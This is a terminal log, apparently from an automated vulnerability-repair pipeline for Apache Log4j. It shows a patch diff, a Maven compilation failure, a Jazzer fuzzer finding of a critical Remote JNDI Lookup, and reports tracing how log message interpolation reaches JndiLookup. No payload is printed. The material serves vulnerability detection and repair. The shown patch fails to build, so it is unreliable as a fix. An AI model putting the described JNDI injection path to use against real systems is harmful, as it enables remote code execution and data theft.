[2;36m                    [0m         +                [1;35mtoAppendTo.append[0m[1m([0mconfig != null && !FORMAT_MESSAGES_NO_LOOKUPS && [2m                [0m
[2;36m                    [0m         [1;35mresult.contains[0m[1m([0m[32m"$[0m[32m{[0m[32m"[0m[1m)[0m ?                                                             [2m                [0m
[2;36m                    [0m                              [1;35mconfig.getSubst[0m[1m([0m[1m)[0m[1;35m.replace[0m[1m([0mevent, result[1m)[0m : result[1m)[0m;            [2m                [0m
[2;36m                    [0m                      [1m}[0m else [1m{[0m                                                               [2m                [0m
[2;36m                    [0m                          [1;35mtoAppendTo.append[0m[1m([0m[32m"null"[0m[1m)[0m;                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         --- a/core/src/main/java/org/apache/logging/log4j/core/helpers/Constants.java       [2m                [0m
[2;36m                    [0m         +++ b/core/src/main/java/org/apache/logging/log4j/core/helpers/Constants.java       [2m                [0m
[2;36m                    [0m         @@ [1;36m-41[0m,[1;36m6[0m +[1;36m41[0m,[1;36m16[0m @@                                                                  [2m                [0m
[2;36m                    [0m              public static final String JNDI_CONTEXT_NAME =                                 [2m                [0m
[2;36m                    [0m         [32m"java:comp/env/log4j/context-name"[0m;                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m              [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m         +     * System property to disable JNDI lookups for security.                       [2m                [0m
[2;36m                    [0m         +     *[35m/[0m                                                                            [2m                [0m
[2;36m                    [0m         +    public static final String LOG4J_ENABLE_JNDI_LOOKUP =                          [2m                [0m
[2;36m                    [0m         [32m"log4j2.enableJndiLookup"[0m;                                                          [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +    [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m         +     * System property to disable message pattern lookups for security.            [2m                [0m
[2;36m                    [0m         +     *[35m/[0m                                                                            [2m                [0m
[2;36m                    [0m         +    public static final String LOG4J_FORMAT_MSG_NO_LOOKUPS =                       [2m                [0m
[2;36m                    [0m         [32m"log4j2.formatMsgNoLookups"[0m;                                                        [2m                [0m
[2;36m                    [0m         +                                                                                   [2m                [0m
[2;36m                    [0m         +    [35m/[0m**                                                                            [2m                [0m
[2;36m                    [0m               * Line separator.                                                             [2m                [0m
[2;36m                    [0m               *[35m/[0m                                                                            [2m                [0m
[2;36m                    [0m              public static final String LINE_SEP =                                          [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1m([0m[1m)[0m[1;35m.getStringProperty[0m[1m([0m[32m"line.separator"[0m, [32m"\n"[0m[1m)[0m;           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ===Patch [33mResult[0m===                                                                  [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m COMPILATION ERROR :                                                         [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m -------------------------------------------------------------                [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m                                                                             [2m                [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/lookup/[0m[95mJndiLoo[0m [2m                [0m
[2;36m                    [0m         [95mkup.java[0m:[1m[[0m[1;36m134[0m,[1;36m9[0m[1m][0m cannot assign a value to final variable ENABLE_JNDI                [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m [1;36m1[0m error                                                                      [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m -------------------------------------------------------------                [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m ------------------------------------------------------------------------     [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m Reactor Summary for Apache Log4j [1;36m2[0m [1;36m2.0[0m-beta9-SNAPSHOT:                       [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m                                                                              [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m Apache Log4j [1;36m2[0m [33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m. SUCCESS [1m[[0m  [1;36m7.456[0m s[1m][0m     [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m Apache Log4j API [33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m.. SUCCESS [1m[[0m  [1;36m8.891[0m s[1m][0m     [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m Apache Log4j Core [33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m[33m...[0m. FAILURE [1m[[0m  [1;36m5.073[0m s[1m][0m     [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m ------------------------------------------------------------------------     [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m BUILD FAILURE                                                                [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m ------------------------------------------------------------------------     [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m Total time:  [1;36m27.634[0m s                                                        [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m Finished at: [1;36m2026[0m-[1;36m01[0m-06T[1;92m17:14:56[0mZ                                            [2m                [0m
[2;36m                    [0m         [1m[[0mINFO[1m][0m ------------------------------------------------------------------------     [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m Failed to execute goal                                                      [2m                [0m
[2;36m                    [0m         org.apache.maven.plugins:maven-compiler-plugin:[1;36m3.1[0m:compile [1m([0mdefault-compile[1m)[0m on     [2m                [0m
[2;36m                    [0m         project log4j-core: Compilation failure                                             [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m                                                                             [2m                [0m
[2;36m                    [0m         [35m/src/logging-log4j2/core/src/main/java/org/apache/logging/log4j/core/lookup/[0m[95mJndiLoo[0m [2m                [0m
[2;36m                    [0m         [95mkup.java[0m:[1m[[0m[1;36m134[0m,[1;36m9[0m[1m][0m cannot assign a value to final variable ENABLE_JNDI                [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m                                                                             [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m -> [1m[[0mHelp [1;36m1[0m[1m][0m                                                                 [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m                                                                             [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m To see the full stack trace of the errors, re-run Maven with the -e switch. [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m Re-run Maven using the -X switch to enable full debug logging.              [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m                                                                             [2m                [0m
[2;36m                    [0m         [1m[[0mERROR[1m][0m For more information about the errors                                       [2m                [0m
[2;36m                    [0m         ===[33mIssue[0m===                                                                         [2m                [0m
[2;36m                    [0m         == Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical:    [2m                [0m
[2;36m                    [0m         Remote JNDI Lookup                                                                  [2m                [0m
[2;36m                    [0m         JNDI lookups with attacker-controlled remote URLs can, depending on the JDK         [2m                [0m
[2;36m                    [0m         version, lead to remote code execution or the exfiltration of information.          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1m([0mNamingContex [2m                [0m
[2;36m                    [0m         tLookup.kt:[1;36m61[0m[1m)[0m                                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1m([0mJndiLookup.jav[1;92ma:60[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1m([0mInterpolator.jav[1;92ma:112[0m[1m)[0m     [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1m([0mStrSubstitutor. [2m                [0m
[2;36m                    [0m         jav[1;92ma:904[0m[1m)[0m                                                                           [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1m([0mStrSubstitutor.jav[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1m([0mStrSubstitutor.jav[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1m)[0m                                                                                   [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1m([0mMessagePattern [2m                [0m
[2;36m                    [0m         Converter.jav[1;92ma:72[0m[1m)[0m                                                                  [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1m([0mPatternFormatter.jav[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1m)[0m                                                                                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1m)[0m                                                                              [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1m([0mPatternLayout.jav [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1m)[0m                                                                               [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1m([0mAbstractStrin [2m                [0m
[2;36m                    [0m         gLayout.jav[1;92ma:45[0m[1m)[0m                                                                    [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1m([0mAbstract [2m                [0m
[2;36m                    [0m         OutputStreamAppender.jav[1;92ma:113[0m[1m)[0m                                                      [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1m([0mAppenderControl.j [2m                [0m
[2;36m                    [0m         av[1;92ma:102[0m[1m)[0m                                                                            [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1m([0mLoggerConfig.jav[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1m)[0m                                                                                 [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:407[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1m([0mLoggerConfig.jav[1;92ma:368[0m[1m)[0m        [2m                [0m
[2;36m                    [0m                 at [1;35morg.apache.logging.log4j.core.Logger.log[0m[1m([0mLogger.jav[1;92ma:110[0m[1m)[0m                [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1m([0mAbstractLogger.jav[1;92ma:1916[0m[1m)[0m          [2m                [0m
[2;36m                    [0m                 at                                                                          [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1m([0mSimpleLoggerFuzzer.jav[1;92ma:42[0m[1m)[0m       [2m                [0m
[2;36m                    [0m         DEDUP_TOKEN: 03a39a742f79fa3d                                                       [2m                [0m
[2;36m                    [0m         == libFuzzer crashing input ==                                                      [2m                [0m
[2;36m                    [0m         ===Evaluation [33mReport[0m===                                                             [2m                [0m
[2;36m                    [0m         # Evaluation Report                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ## Summary                                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         A critical security vulnerability has been detected in the Apache Log4j library     [2m                [0m
[2;36m                    [0m         where JNDI [1m([0mJava Naming and Directory Interface[1m)[0m lookups can be triggered with      [2m                [0m
[2;36m                    [0m         attacker-controlled remote URLs. This vulnerability can lead to remote code         [2m                [0m
[2;36m                    [0m         execution or information exfiltration, depending on the JDK version in use. The     [2m                [0m
[2;36m                    [0m         issue was discovered through fuzzing and manifests when user-controlled input       [2m                [0m
[2;36m                    [0m         containing JNDI lookup syntax is processed by Log4j's message pattern conversion    [2m                [0m
[2;36m                    [0m         and interpolation mechanisms.                                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ## Description                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         The issue represents a Remote JNDI Lookup vulnerability that was flagged as a       [2m                [0m
[2;36m                    [0m         critical security issue                                                             [2m                [0m
[2;36m                    [0m         [1m([0m`com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical`[1m)[0m during fuzzing     [2m                [0m
[2;36m                    [0m         operations. The vulnerability occurs when Log4j processes log messages containing   [2m                [0m
[2;36m                    [0m         JNDI lookup expressions that reference remote URLs controlled by potential          [2m                [0m
[2;36m                    [0m         attackers.                                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ### Stack Trace Analysis                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         The exception originates from the Jazzer sanitizer                                  [2m                [0m
[2;36m                    [0m         [1m([0m`NamingContextLookup.lookupHook`[1m)[0m which detected a dangerous JNDI lookup           [2m                [0m
[2;36m                    [0m         operation. The call chain reveals the following execution flow:                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m. **Entry Point**: The fuzzer test [1m([0m`SimpleLoggerFuzzer.fuzzerTestOneInput`[1m)[0m       [2m                [0m
[2;36m                    [0m         invokes a logging operation via `[1;35mAbstractLogger.warn[0m[1m([0m[1m)[0m`                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m. **Log Processing**: The message passes through Log4j's logging infrastructure    [2m                [0m
[2;36m                    [0m         [1m([0m`[1;35mLogger.log[0m[1m([0m[1m)[0m`, `[1;35mLoggerConfig.log[0m[1m([0m[1m)[0m`, `[1;35mLoggerConfig.callAppenders[0m[1m([0m[1m)[0m`[1m)[0m              [2m                [0m
[2;36m                    [0m         [1;36m3[0m. **Pattern Formatting**: The message reaches the pattern layout system where      [2m                [0m
[2;36m                    [0m         `[1;35mPatternLayout.toSerializable[0m[1m([0m[1m)[0m` and `[1;35mMessagePatternConverter.format[0m[1m([0m[1m)[0m` process the [2m                [0m
[2;36m                    [0m         content                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m. **String Substitution**: The `StrSubstitutor` component performs variable        [2m                [0m
[2;36m                    [0m         resolution through multiple method calls [1m([0m`[1;35mreplace[0m[1m([0m[1m)[0m`, `[1;35msubstitute[0m[1m([0m[1m)[0m`,              [2m                [0m
[2;36m                    [0m         `[1;35mresolveVariable[0m[1m([0m[1m)[0m`[1m)[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m5[0m. **Lookup Interpolation**: The `[1;35mInterpolator.lookup[0m[1m([0m[1m)[0m` method delegates to        [2m                [0m
[2;36m                    [0m         various lookup handlers                                                             [2m                [0m
[2;36m                    [0m         [1;36m6[0m. **Vulnerable Operation**: `[1;35mJndiLookup.lookup[0m[1m([0m[1m)[0m` is invoked, which triggers the   [2m                [0m
[2;36m                    [0m         actual JNDI lookup operation that the security hook intercepts                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ### Vulnerability Characteristics                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         The vulnerability type is explicitly identified as a Remote JNDI Lookup             [2m                [0m
[2;36m                    [0m         vulnerability. The security implications are severe:                                [2m                [0m
[2;36m                    [0m         - Remote Code Execution [1m([0mRCE[1m)[0m: Attackers can potentially execute arbitrary code on  [2m                [0m
[2;36m                    [0m         the system                                                                          [2m                [0m
[2;36m                    [0m         - Information Exfiltration: Sensitive data can be extracted from the application    [2m                [0m
[2;36m                    [0m         - JDK Version Dependent: The exploitability and specific attack vectors vary based  [2m                [0m
[2;36m                    [0m         on the Java Development Kit version                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ### Key Observations                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m. **Interpolation Mechanism**: The vulnerability is embedded in Log4j's message    [2m                [0m
[2;36m                    [0m         interpolation feature, which processes lookup expressions within log messages       [2m                [0m
[2;36m                    [0m         [1;36m2[0m. **JNDI Lookup Component**: The `JndiLookup` class [1m([0mat line [1;36m60[0m[1m)[0m is the specific   [2m                [0m
[2;36m                    [0m         component performing the dangerous operation                                        [2m                [0m
[2;36m                    [0m         [1;36m3[0m. **Pattern Processing**: The vulnerability is triggered during the formatting of  [2m                [0m
[2;36m                    [0m         log messages, specifically when the `MessagePatternConverter` processes             [2m                [0m
[2;36m                    [0m         user-controlled input                                                               [2m                [0m
[2;36m                    [0m         [1;36m4[0m. **Substitution Engine**: The `StrSubstitutor` class acts as the intermediary     [2m                [0m
[2;36m                    [0m         that resolves variables and triggers lookups                                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ### Areas for Investigation                                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         To obtain a comprehensive understanding of this vulnerability, the following        [2m                [0m
[2;36m                    [0m         components should be examined:                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m. **org.apache.logging.log4j.core.lookup.JndiLookup**: The primary class           [2m                [0m
[2;36m                    [0m         performing JNDI lookups, particularly the `[1;35mlookup[0m[1m([0m[1m)[0m` method at line [1;36m60[0m              [2m                [0m
[2;36m                    [0m         [1;36m2[0m. **org.apache.logging.log4j.core.lookup.Interpolator**: The lookup dispatcher     [2m                [0m
[2;36m                    [0m         that routes lookup requests to specific handlers like JndiLookup                    [2m                [0m
[2;36m                    [0m         [1;36m3[0m. **org.apache.logging.log4j.core.lookup.StrSubstitutor**: The string substitution [2m                [0m
[2;36m                    [0m         mechanism that identifies and processes lookup expressions in log messages          [2m                [0m
[2;36m                    [0m         [1;36m4[0m. **org.apache.logging.log4j.core.pattern.MessagePatternConverter**: The message   [2m                [0m
[2;36m                    [0m         formatting component that initiates the substitution process                        [2m                [0m
[2;36m                    [0m         [1;36m5[0m. **Configuration Files**: Log4j configuration [1m([0me.g., log4j2.xml[1m)[0m to understand    [2m                [0m
[2;36m                    [0m         which pattern layouts and lookups are enabled                                       [2m                [0m
[2;36m                    [0m         [1;36m6[0m. **Input Validation**: The path from user input to the logging statement to       [2m                [0m
[2;36m                    [0m         understand how attacker-controlled data reaches the vulnerable code                 [2m                [0m
[2;36m                    [0m         [1;36m7[0m. **com.example.SimpleLoggerFuzzer**: The fuzzer harness to understand what type   [2m                [0m
[2;36m                    [0m         of input triggers the vulnerability [1m([0mthough this is the entry point, not the root   [2m                [0m
[2;36m                    [0m         cause[1m)[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         The deduplication token `03a39a742f79fa3d` indicates this is a distinct crash       [2m                [0m
[2;36m                    [0m         scenario that can be reproduced with specific fuzzing input.                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         ## Initial Issue Log                                                                [2m                [0m
[2;36m                    [0m         Here is the initial issue log of the codebase:                                      [2m                [0m
[2;36m                    [0m         [1m<[0m[1;95missue[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: [0m   [2m                [0m
[2;36m                    [0m         [39mRemote JNDI Lookup[0m                                                                  [2m                [0m
[2;36m                    [0m         [39mJNDI lookups with attacker-controlled remote URLs can, depending on the JDK[0m         [2m                [0m
[2;36m                    [0m         [39mversion, lead to remote code execution or the exfiltration of information.[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35mcom.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook[0m[1;39m([0m[39mNamingContex[0m [2m                [0m
[2;36m                    [0m         [39mtLookup.kt:[0m[1;36m61[0m[1;39m)[0m                                                                      [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.JndiLookup.lookup[0m[1;39m([0m[39mJndiLookup.jav[0m[1;92ma:60[0m[1;39m)[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.Interpolator.lookup[0m[1;39m([0m[39mInterpolator.jav[0m[1;92ma:112[0m[1;39m)[0m     [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable[0m[1;39m([0m[39mStrSubstitutor.[0m [2m                [0m
[2;36m                    [0m         [39mjav[0m[1;92ma:904[0m[1;39m)[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m825[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.substitute[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m737[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.lookup.StrSubstitutor.replace[0m[1;39m([0m[39mStrSubstitutor.jav[0m[1;92ma:306[0m [2m                [0m
[2;36m                    [0m         [1;39m)[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.MessagePatternConverter.format[0m[1;39m([0m[39mMessagePattern[0m [2m                [0m
[2;36m                    [0m         [39mConverter.jav[0m[1;92ma:72[0m[1;39m)[0m                                                                  [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.pattern.PatternFormatter.format[0m[1;39m([0m[39mPatternFormatter.jav[0m[1;92ma[0m [2m                [0m
[2;36m                    [0m         [1;92m:36[0m[1;39m)[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1;39m([0m[39mPatternLayout.jav[0m [2m                [0m
[2;36m                    [0m         [1;92ma:166[0m[1;39m)[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.PatternLayout.toSerializable[0m[1;39m([0m[39mPatternLayout.jav[0m [2m                [0m
[2;36m                    [0m         [1;92ma:51[0m[1;39m)[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.layout.AbstractStringLayout.toByteArray[0m[1;39m([0m[39mAbstractStrin[0m [2m                [0m
[2;36m                    [0m         [39mgLayout.jav[0m[1;92ma:45[0m[1;39m)[0m                                                                    [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append[0m[1;39m([0m[39mAbstract[0m [2m                [0m
[2;36m                    [0m         [39mOutputStreamAppender.jav[0m[1;92ma:113[0m[1;39m)[0m                                                      [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.AppenderControl.callAppender[0m[1;39m([0m[39mAppenderControl.j[0m [2m                [0m
[2;36m                    [0m         [39mav[0m[1;92ma:102[0m[1;39m)[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.callAppenders[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:4[0m [2m                [0m
[2;36m                    [0m         [1;92m26[0m[1;39m)[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:407[0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.core.config.LoggerConfig.log[0m[1;39m([0m[39mLoggerConfig.jav[0m[1;92ma:368[0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m[1;35morg.apache.logging.log4j.core.Logger.log[0m[1;39m([0m[39mLogger.jav[0m[1;92ma:110[0m[1;39m)[0m                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1;39m([0m[39mAbstractLogger.jav[0m[1;92ma:1916[0m[1;39m)[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1;39m([0m[39mSimpleLoggerFuzzer.jav[0m[1;92ma:42[0m[1;39m)[0m       [2m                [0m
[2;36m                    [0m         [39mDEDUP_TOKEN: 03a39a742f79fa3d[0m                                                       [2m                [0m
[2;36m                    [0m         [39m== libFuzzer crashing input ==[0m                                                      [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95missue[0m[39m>[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m===Analysis [0m[33mReport[0m[39m===[0m                                                               [2m                [0m
[2;36m                    [0m         [39m# Analysis Report[0m                                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Relevant Code Snippets[0m                                                           [2m                [0m
[2;36m                    [0m         [39m<code_snippets>[0m                                                                     [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:1[0m[39m-[0m[1;36m88[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
